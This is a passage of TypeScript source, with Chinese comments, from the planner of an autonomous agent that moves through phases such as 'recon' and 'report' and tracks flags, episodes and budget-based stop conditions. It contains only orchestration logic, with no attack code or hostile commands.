		const kbAdded = appendIntentSpecs(st, kbSpecs, INTENT_SOFT_CAP, { rejectedOut: rejectedReasons, cooldownMs });
		const allDerived = [...derived.added, ...kbAdded];
		if (allDerived.length) {
			st.runtime.expansions = (st.runtime.expansions ?? 0) + 1;
			st.runtime.lastExpandAt = Date.now();
			return { added: allDerived, reason: "derive", phase: st.project.phase, rejectedReasons };
		}
	}

	// #41 策略收敛：completionRejects >= 1 且无活跃候选时，引导收敛至 report / seal，禁止原样重播 Episode 空转循环
	const conv = buildConvergenceAdvice(st, cfg);
	if (conv.active && conv.forbidBlindRerun) {
		if (st.project.phase !== "report") {
			st.project.phase = "report";
			const repAdded = seedPhase(st, "report");
			return {
				added: repAdded,
				reason: repAdded.length ? "converge-to-report" : "report-seal-ready",
				phase: "report",
				rejectedReasons,
			};
		}
		return { added: [], reason: "report-seal-ready", phase: "report", rejectedReasons };
	}

	for (let guard = 0; guard < PHASE_ORDER.length; guard++) {
		const adv = maybeAdvance(st);
		if (!adv.advanced) break;
		if (adv.added.length) return { added: adv.added, reason: "advance", phase: adv.phase, rejectedReasons };
	}

	const curIdx = phaseIndex(st.project.phase);
	const curIntents = Object.values(st.intents).filter((i) => i.phase === st.project.phase);
	if (curIdx >= PHASE_ORDER.length - 1 || curIntents.length === 0) {
		const ep = (st.project.episode ?? 1) + 1;
		if (cfg.maxEpisodes === 0 || ep <= cfg.maxEpisodes) {
			st.project.episode = ep;
			st.project.phase = "recon";
			st.runtime.reportWritten = false;
			const added = seedEpisode(st, ep);
			st.runtime.expansions = (st.runtime.expansions ?? 0) + 1;
			st.runtime.lastExpandAt = Date.now();
			return { added, reason: "episode", phase: "recon", episode: ep, rejectedReasons };
		}
	}

	const fb = addFallbackIntent(st);
	return { added: fb ? [fb] : [], reason: fb ? "fallback" : "exhausted", phase: st.project.phase, rejectedReasons };
}

export const expandGraph = autoPlan;

export function sigOf(st: NuwaState): string {
	const ints = Object.values(st.intents);
	const open = ints.filter((i) => i.status === "open").length;
	const claimed = ints.filter((i) => i.status === "claimed").length;
	const done = ints.filter((i) => i.status === "done").length;
	const blocked = ints.filter((i) => i.status === "blocked").length;
	const facts = Object.keys(st.facts).length;
	const flags = Object.values(st.facts).filter((f) => f.kind === "flag").length;
	const last = Object.keys(st.facts).sort().at(-1) ?? "-";
	const status = st.runtime?.status === "sealed_negative" ? "sealed_negative" : st.project.status;
	return `${status}|${st.project.phase}|${open}|${claimed}|${done}|${blocked}|${facts}|${flags}|${last}`;
}

/** 预算压力 0..1.5：只用于降档与提示，不产生停机。 */
export function budgetPressure(st: NuwaState, cfg: Cfg): number {
	const rt = st.runtime;
	const mins = (Date.now() - rt.startedAt) / 60000;
	const parts: number[] = [];
	if (cfg.maxTurns > 0) parts.push(rt.turns / cfg.maxTurns);
	if (cfg.maxMinutes > 0) parts.push(mins / cfg.maxMinutes);
	if (cfg.maxTokens > 0) parts.push(rt.tokens / cfg.maxTokens);
	if (cfg.maxStall > 0) parts.push(rt.stall / cfg.maxStall);
	if (cfg.maxIdle > 0) parts.push(rt.idle / cfg.maxIdle);
	const p = parts.length ? Math.max(...parts) : 0;
	return Math.min(1.5, Math.max(0, p));
}

/**
 * 停机判定（#22）：
 * 合法终态包括目标完成（completed）、负向封盘（sealed_negative）以及人工 stop。
 * infinite 模式下预算永不产生强制停机（改由 shouldRecommendSeal 建议封盘）；NUWA_INFINITE=0 时保留旧预算闸做兼容。
 */
export function stopReason(st: NuwaState, cfg: Cfg): string | null {
	if (st.project.status === "completed" || st.runtime?.status === "completed") return "completed";
	if (st.project.status === "sealed_negative" || st.runtime?.status === "sealed_negative") return "sealed_negative";
	if (st.project.status === "stopped") return st.project.stopReason ?? "stopped";
	if (cfg.infinite) return null;
	const rt = st.runtime;
	const mins = (Date.now() - rt.startedAt) / 60000;
	if (cfg.maxTurns > 0 && rt.turns > cfg.maxTurns) return `max_turns(${rt.turns}/${cfg.maxTurns})`;
	if (cfg.maxMinutes > 0 && mins > cfg.maxMinutes) return `max_minutes(${Math.round(mins)}/${cfg.maxMinutes})`;
	if (cfg.maxTokens > 0 && rt.tokens > cfg.maxTokens) return `max_tokens(${rt.tokens}/${cfg.maxTokens})`;
	if (rt.stall >= cfg.maxStall) return `max_stall(${rt.stall}/${cfg.maxStall})`;
	if (rt.idle >= cfg.maxIdle) return `max_idle(${rt.idle}/${cfg.maxIdle})`;
	return null;
}

